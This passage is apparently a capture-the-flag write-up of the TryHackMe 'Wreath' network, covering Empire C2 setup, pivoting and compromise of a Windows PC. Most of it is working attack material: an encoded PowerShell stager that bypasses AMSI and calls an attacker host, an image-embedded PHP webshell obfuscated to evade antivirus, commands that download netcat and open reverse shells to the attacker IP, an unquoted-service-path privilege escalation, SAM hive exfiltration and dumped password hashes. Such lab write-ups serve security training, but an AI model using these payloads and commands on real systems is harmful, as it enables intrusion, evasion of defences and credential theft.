└─$ starkiller
```

This brings up the GUI.

To log in, the default info is in the screenshot below.  I will not be showing any GUI in this guide, but it's fairly straightforward if you want to use it.

![wreath3.PNG](./img/wreath3.PNG "wreath3.PNG")


Our HTTP listner.  The `Host` option is our attacking machine.  The port is set to `8000` by default

```
(Empire: usestager/multi/bash) > uselistener http                                                
                                                                                                  
 Author       @harmj0y                        
 Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST                                                        
              approach.                                     
 Name         HTTP[S]   
 (Empire: uselistener/http) > set Name CLIHTTP 
[*] Set Name to CLIHTTP  
(Empire: uselistener/http) > set Host 10.50.184.132       
[*] Set Host to 10.50.184.132               
(Empire: uselistener/http) > execute           
[+] Listener CLIHTTP successfully started
```

Our HTTP Hop listener, to pass to the first listener.  Note `RedirectListener` points back to our first listener, and the `Host` points to the compromised web server.  This will also create a folder with necessary files in our `/tmp` directory.

```
(Empire: listeners) > uselistener http_hop

 Author       @harmj0y                                                              
 Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST 
              approach.                                                             
 Name         HTTP[S] Hop                                                           

(Empire: uselistener/http_hop) > set RedirectListener CLIHTTP
[*] Set RedirectListener to CLIHTTP
(Empire: uselistener/http_hop) > set Host 10.200.187.200
[*] Set Host to 10.200.187.200
(Empire: uselistener/http_hop) > set Port 56565
[*] Set Port to 56565
(Empire: uselistener/http_hop) > execute
[+] Listener http_hop successfully started

```

Our Stager, to be executed on the target (Git Server).  We set the `Listener` to be our HTTP Hop listener.  The command we get is what we will paste into evil winrm.

```
(Empire: listeners) > usestager multi/launcher

 Author       @harmj0y                                          
 Description  Generates a one-liner stage0 launcher for Empire. 
 Name         multi/launcher

(Empire: usestager/multi/launcher) > set Listener http_hop
[*] Set Listener to http_hop
(Empire: usestager/multi/launcher) > execute
powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAG8ATgBUAGEAYgBMAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBqAE8AcgAgAC0AZwBFACAAMwApAHsAJABSAEUAZgA9AFsAUgBlAGYAXQAuAEEAUwBTAEUAbQBiAEwAWQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIARQBGAC4ARwBlAHQARgBJAEUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEAbABVAEUAKAAkAG4AVQBMAEwALAAkAHQAUgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgAiAEcAZQB0AEYAaQBlAGAAbABkACIAKAAnAG0AXwBlACcAKwAnAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuACcAKwAnAFAAdQBiAGwAaQBjACwAJwArACcASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQAnACsAJwBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAJwArACcAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgAiAEcAZQB0AEYAaQBlAGAAbABkACIAKAAnAGUAdAAnACsAJwB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgAnACsAJwBsAGkAYwAsAFMAJwArACcAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQByAFYASQBjAEUAUABPAEkAbgBUAE0AYQBOAEEAZwBFAHIAXQA6ADoARQB4AFAAZQBDAHQAMQAwADAAQwBPAE4AdABJAE4AVQBFAD0AMAA7ACQAZQBCAGQARAA9AE4ARQB3AC0ATwBCAEoAZQBDAHQAIABTAFkAUwB0AEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBMAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABFAGIARABkAC4ASABlAEEAZABlAFIAcwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAZQBCAGQARAAuAFAAUgBPAHgAWQA9AFsAUwB5AHMAVABlAE0ALgBOAGUAVAAuAFcARQBCAFIAZQBRAHUARQBzAHQAXQA6ADoARABlAGYAQQB1AGwAdABXAEUAYgBQAHIATwB4AHkAOwAkAGUAYgBkAGQALgBQAHIAbwB4AHkALgBDAFIAZQBkAEUATgB0AGkAQQBMAFMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQB0AC4AQwBSAGUARABFAG4AdABJAGEATABDAEEAYwBoAGUAXQA6ADoARABFAGYAQQBVAEwAVABOAGUAVAB3AG8AUgBrAEMAUgBFAGQAZQBuAFQAaQBhAGwAUwA7ACQASwA9AFsAUwB5AFMAVABlAE0ALgBUAEUAeAB0AC4ARQBOAEMATwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAeQBUAEUAcwAoACcAVgA8AEsARAA6AHoAewAtAD0AUQA+AHcAagB1ACwAdgA/AFsAWgAvAFIALgBCAEAAWAB8AHAAeABMAHQAYwBDACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQARQBiAGQARAAuAEgARQBBAEQARQBSAFMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AEIASABCAHEAVgAxAFIAdAAxAHcASwBVAGwAdwBFAG8AZwBIAGwATwBhADkARwBjAEIAZABRAD0AIgApADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAG4AQwBvAEQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcAZQBUAFMAdAByAEkAbgBnACgAWwBDAG8AbgB2AGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAHMARQA2ADQAUwBUAHIAaQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHkAQQBEAEEAQQBNAEEAQQB1AEEARABFAEEATwBBAEEAMwBBAEMANABBAE0AZwBBAHcAQQBEAEEAQQBPAGcAQQAxAEEARABZAEEATgBRAEEAMgBBAEQAVQBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABoAG8AcAA9ACcAaAB0AHQAcABfAGgAbwBwACcAOwAkAGQAQQB0AGEAPQAkAEUAYgBEAEQALgBEAE8AdwBOAEwAbwBBAGQARABBAFQAQQAoACQAcwBFAFIAKwAkAHQAKQA7ACQASQBWAD0AJABEAEEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABEAGEAdABhAFsANAAuAC4AJABkAEEAdABBAC4ATABFAE4ARwB0AEgAXQA7AC0ASgBPAEkATgBbAEMASABBAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
```

Now we have to set up the jump server on the compromised web server.

First we need to transfer the files generated by the http_hop listener.  First we make a directory on the web server.

```
[root@prod-serv ~]# cd /tmp
[root@prod-serv tmp]# mkdir hop-narrowtomato
[root@prod-serv tmp]# cd hop-narrowtomato/
```

Then we zip up and transfer the files.  I used `scp` this time, a bit more elegant than HTTP since we have easy SSH access.

```
┌──(kali㉿kali)-[/tmp]
└─$ zip -r http_hop.zip http_hop
  adding: http_hop/ (stored 0%)
  adding: http_hop/admin/ (stored 0%)
  adding: http_hop/admin/get.php (deflated 67%)
  adding: http_hop/news.php (deflated 67%)
  adding: http_hop/login/ (stored 0%)
  adding: http_hop/login/process.php (deflated 67%)

┌──(kali㉿kali)-[/tmp]
└─$ scp -i ~/tryhackme/wreath/id_rsa http_hop.zip root@thomaswreath.thm:/tmp/hop-narrowtomato/http_hop.zip
http_hop.zip                         100% 3200    24.5KB/s   00:00    
```

Unzip on the web server and serve using `php`

```
[root@prod-serv hop-narrowtomato]# unzip http_hop.zip 
Archive:  http_hop.zip
   creating: http_hop/
   creating: http_hop/admin/
  inflating: http_hop/admin/get.php  
  inflating: http_hop/news.php       
   creating: http_hop/login/
  inflating: http_hop/login/process.php  
[root@prod-serv hop-narrowtomato]# ls
http_hop  http_hop.zip
[root@prod-serv hop-narrowtomato]# mv http_hop/* .
[root@prod-serv hop-narrowtomato]# ls
admin  http_hop  http_hop.zip  login  news.php
[root@prod-serv hop-narrowtomato]# php -S 0.0.0.0:56565 &>/dev/null &
[1] 6791
```

Now we should be able to execute our stager and get an agent in Empire

```
┌──(kali㉿kali)-[~/tryhackme/wreath]                                                                   
└─$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i gitserver.thm   

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAG8ATgBUAGEAYgB .... (see above for full command)
```

```
[+] New agent D7CNASPL checked in   
[*] Sending agent (stage 2) to D7CNASPL at 10.200.187.200     
(Empire: agents) > rename D7CNASPL gitserver                              
(Empire: agents) > interact gitserver
```

---
## Task 33 - Personal PC Enumeration

For our convenience, let's add the last host to our `/etc/hosts` file.  Below are all lines we have added.

```
10.200.187.200  thomaswreath.thm
10.200.187.150  gitserver.thm
10.200.187.100  personal.thm
```

The task outlines how we can use `evil-winrm` to include a path to scripts, and that Empire comes with handy scripts for our enumeration of this next host.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i gitserver.thm -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1     
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Help Invoke-Portscan

(shows help)

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.187.100 -TopPorts 50


Hostname      : 10.200.187.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 21, 23...}
finishTime    : 1/17/2022 4:50:00 PM
```

---
## Task 34 - Personal PC Pivoting

Now that we've identified that there's a web server running on port 80, we need to pivot through the Git Server to access it.  We will use a `chisel` forward proxy as recommended in the task.

The prerequisite is to open a port in Windows Firewall on the Git Server

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="Chisel-narrowtomato" dir=in action=allow protocol=tcp localport=56565
Ok.
```

Now to set up the `chisel` forward proxy.  First we need to get a compatible Windows static binary and unzip.  We rename it for convenience.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz

┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ gunzip chisel_1.7.6_windows_amd64.gz

┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ mv chisel_1.7.6_windows_amd64 chisel-narrowtomato.exe
```

We can upload the file over `evil-winrm` and set up our proxy.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload chisel-narrowtomato.exe
Info: Uploading chisel-narrowtomato.exe to C:\Users\Administrator\Documents\chisel-narrowtomato.exe

                                                             
Data: 11397800 bytes of 11397800 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Administrator\Documents> .\chisel-narrowtomato.exe server -p 56565 --socks5
chisel-narrowtomato.exe : 2022/01/17 17:21:24 server: Fingerprint NZDpE6orGI9tiBm7z28emdqfL+Cbhy0JWAMz6wDy1zM=
    + CategoryInfo          : NotSpecified: (2022/01/17 17:2...y0JWAMz6wDy1zM=:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2022/01/17 17:21:24 server: Listening on http://0.0.0.0:56565
```

Back on our attacking machine

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ chisel client gitserver.thm:56565 4444:socks
2022/01/17 12:23:06 client: Connecting to ws://gitserver.thm:56565
2022/01/17 12:23:06 client: tun: proxy#127.0.0.1:4444=>socks: Listening
2022/01/17 12:23:07 client: Connected (Latency 119.728162ms)
```

Now we should be able to point FoxyProxy to localhost:4444 and we should be able to hit the webserver on the Personal PC.  REMEMBER TO SET THE TYPE TO SOCKS5, I got stuck on this for a while.

![wreath4.PNG](./img/wreath4.PNG "wreath4.PNG")

Browsing to `http://10.200.187.100/` gets us the website.

---
## Task 35 - Personal PC - The Wonders of Git

Back to the Git server for a bit.  Looking around we can find and download the `Website.git` respository with `evil-winrm`.

```
*Evil-WinRM* PS C:\GitStack\repositories> download C:\GitStack\repositories\Website.git
Info: Downloading C:\GitStack\repositories\Website.git to ./C:\GitStack\repositories\Website.git
Info: Download successful!
```

Now back on our attacking machine where the file was downloaded.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ mv C:\\GitStack\\repositories\\Website.git Website.git
                                           
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ cd Website.git     
                                               
┌──(kali㉿kali)-[~/tryhackme/wreath/Website.git]
└─$ ls
'C:\GitStack\repositories\Website.git'   

┌──(kali㉿kali)-[~/tryhackme/wreath/Website.git]
└─$ mv C:\\GitStack\\repositories\\Website.git .git

──(kali㉿kali)-[~/tryhackme/wreath/Website.git]       
└─$ cd ..                                       
                                                 
┌──(kali㉿kali)-[~/tryhackme/wreath]              
└─$ git clone https://github.com/internetwache/GitTools  

┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ ./GitTools/Extractor/extractor.sh Website.git Website
```

Now that the respository is extracted we can explore.  Looking at the `commit-meta.txt` in each folder shows us that this is the order of the commits.

```
earliest
2-70dde80cc19ec76704567996738894828f4ee895
1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
0-345ac8b236064b431fa43f53d91c98c4834ef8f3
latest
```

---
## Task 36 - Personal PC Website Code Analysis

Looking inside of the latest commit, `0-345ac8b236064b431fa43f53d91c98c4834ef8f3`, we have one PHP file.

```
┌──(kali㉿kali)-[~/tryhackme/wreath/Website/0-345ac8b236064b431fa43f53d91c98c4834ef8f3]
└─$ find . -name "*.php"  
./resources/index.php
```

Reviewing this code reveals that if we can create a file that meets two conditions, we can upload a file with a post request to `/resources` and it will go to the `/uploads` directory.

1. The file has `.jpg`, `.jpeg`, `.png`, or `.gif` in the name after the filename

2. The file contains image size dimensions in the metadata.

---
## Task 39 - Personal PC Exploit PoC

Now back to the Personal PC.  Trying to browse to our newfound `/resources` results in authentication.  Fortunately we can use creds we found previously with Mimikatz to log in here.  We now see the upload page.

Let's adjust an image to see if we can get it to upload and run code using `exiftool`.  After taking a screenshot and saving it as `test-narrowtomato.png.php`:

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-narrowtomato.png.php 
    1 image files updated
                           
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ exiftool test-narrowtomato.png.php
ExifTool Version Number         : 12.36
File Name                       : test-narrowtomato.png.php
Directory                       : .
File Size                       : 663 KiB
File Modification Date/Time     : 2022:01:17 15:51:13-05:00
File Access Date/Time           : 2022:01:17 15:51:19-05:00
File Inode Change Date/Time     : 2022:01:17 15:52:14-05:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1278
Image Height                    : 1326
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
Image Size                      : 1278x1326
Megapixels                      : 1.7
```

We then upload and browse to verify that we can execute code in this manner.

![wreath5.PNG](./img/wreath5.PNG "wreath5.PNG")

---
## Task 40 - AV Evasion - PHP Payload Obfuscation

Here is the payload that we will use to create a webshell.

```
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

We'll use the tool at `https://www.gaijin.at/en/tools/php-obfuscator` as recommended by the task.

```
<?php $q0=$_GET[base64_decode('d3JlYXRo')];if(isset($q0)){echo base64_decode('PHByZT4=').shell_exec($q0).base64_decode('PC9wcmU+');}die();?>
```

Then we escape the dollar signs to prevent Bash from interpreting them as such.

```
<?php \$q0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$q0)){echo base64_decode('PHByZT4=').shell_exec(\$q0).base64_decode('PC9wcmU+');}die();?>
```

Now we insert this into our image file (after changing the name).

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ cp test-narrowtomato.png.php shell-narrowtomato.png.php
         
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ exiftool -Comment="<?php \$q0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$q0)){echo base64_decode('PHByZT4=').shell_exec(\$q0).base64_decode('PC9wcmU+');}die();?>" shell-narrowtomato.png.php 
    1 image files updated
```

Finally, upload and execute.

![wreath6.PNG](./img/wreath6.PNG "wreath6.PNG")

---
## Task 41 - AV Evasion Compiling Netcat & Reverse Shell

Let's develop this into a full reverse shell.  First let's grab a static binary of Netcat for Windows.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ git clone https://github.com/int0x33/nc.exe/
```

Then start an HTTP server in the directory with `nc64.exe`.

```
┌──(kali㉿kali)-[~/tryhackme/wreath/nc.exe]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now browse to the below to get the web server to download the file (replace with your IP, port and username).

```
http://10.200.187.100/resources/uploads/shell-narrowtomato.png.php?wreath=curl http://10.50.184.132:8000/nc64.exe -o c:\\windows\\temp\\nc-narrowtomato.exe
```

Set up our listener

```
┌──(kali㉿kali)-[~/tryhackme/wreath/nc.exe]
└─$ nc -lvnp 443          
listening on [any] 443 ...
```

Execute the shell through our browser.

```
http://10.200.187.100/resources/uploads/shell-narrowtomato.png.php?wreath=powershell.exe c:\\windows\\temp\\nc-narrowtomato.exe 10.50.184.132 443 -e cmd.exe
```

```
┌──(kali㉿kali)-[~/tryhackme/wreath/nc.exe]
└─$ nc -lvnp 443          
listening on [any] 443 ...
connect to [10.50.184.132] from (UNKNOWN) [10.200.187.100] 51493
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads>whoami
whoami
wreath-pc\thomas
```

---
## Task 42 - AV Evasion Enumeration

Check to see if there are any interesting services running.

```
C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

The service `SystemExplorerHelpService` has an unquoted path.  Let's check to see what account it's running under.

```
C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

It's the local system user.  Lastly, let's see if we can write to any of the directories with spaces in them in the unquoted path.

```
C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer'"
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer'"


    Directory: C:\Program Files (x86)


Path            Owner                  Access                                                                          
----            -----                  ------                                                                          
System Explorer BUILTIN\Administrators BUILTIN\Users Allow  FullControl... 
```

We have write access (`BUILTIN\Users`).  This is all we need.

---
## Task 43 - AV Evasion Privilege Escalation

We'll write and compile a C# program using the instructions in the task.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ cat Wrapper.cs         
using System;
using System.Diagnostics;

namespace Wrapper {
        class Program {
                static void Main() {
                        Process proc = new Process();
                        ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-narrowtomato.exe", "10.50.184.132 5555 -e cmd.exe");
                        procInfo.CreateNoWindow = true;
                        proc.StartInfo = procInfo;
                        proc.Start();
                }
        }
}
                       
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ mcs Wrapper.cs
```

Use impacket to set up an SMB share

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
Impacket v0.9.25.dev1+20220105.151306.10e53952 - Copyright 2021 SecureAuth Corporation
```

Connect our share from the Personal PC, then copy Wrapper.exe, then remove the share

```
C:\xampp\htdocs\resources\uploads>net use \\10.50.184.132\share /USER:user s3cureP@ssword
net use \\10.50.184.132\share /USER:user s3cureP@ssword
The command completed successfully.

C:\xampp\htdocs\resources\uploads>copy \\10.50.184.132\share\Wrapper.exe %TEMP%\wrapper-narrowtomato.exe
copy \\10.50.184.132\share\Wrapper.exe %TEMP%\wrapper-narrowtomato.exe
        1 file(s) copied.

C:\xampp\htdocs\resources\uploads>net use \\10.50.184.132\share /del
net use \\10.50.184.132\share /del
\\10.50.184.132\share was deleted successfully.
```

You can test by starting a listener and executing the file.

Now we need to copy our wrapper to intercept the filepath of the service we found, and stop/start the service.  Make sure your listener is ready.

```
C:\xampp\htdocs\resources\uploads>copy %TEMP%\wrapper-narrowtomato.exe "C:\Program Files (x86)\System Explorer\System.exe"
copy %TEMP%\wrapper-narrowtomato.exe "C:\Program Files (x86)\System Explorer\System.exe"
        1 file(s) copied.

C:\xampp\htdocs\resources\uploads>sc stop SystemExplorerHelpService
sc stop SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x1388

C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
sc start SystemExplorerHelpService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

We got a shell as system!

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.50.184.132] from (UNKNOWN) [10.200.187.100] 51756
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Be sure to clean up your .exe and make sure the service is started.

```
C:\xampp\htdocs\resources\uploads>del "C:\Program Files (x86)\System Explorer\System.exe"
del "C:\Program Files (x86)\System Explorer\System.exe"

C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
sc start SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2488
        FLAGS              : 
```

---
## Task 44 - Exfiltration

Now let's re-attach the SMB server and exfiltrate the SAM and SYSTEM Hives.

```
C:\Windows\system32>net use \\10.50.184.132\share /USER:user s3cureP@ssword
net use \\10.50.184.132\share /USER:user s3cureP@ssword
The command completed successfully.

C:\Windows\system32>reg.exe save HKLM\SAM \\10.50.184.132\share\sam.bak
reg.exe save HKLM\SAM \\10.50.184.132\share\sam.bak
The operation completed successfully.

C:\Windows\system32>reg.exe save HKLM\SYSTEM \\10.50.184.132\share\system.bak
reg.exe save HKLM\SYSTEM \\10.50.184.132\share\system.bak
The operation completed successfully.

C:\Windows\system32>net use \\10.50.184.132\share /del
net use \\10.50.184.132\share /del
\\10.50.184.132\share was deleted successfully.
```

Now we have sam.bak and system.bak locally on our Kali machine.  We can use Impacket to pull the hashes out.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.9.25.dev1+20220105.151306.10e53952 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
[*] Cleaning up... 
```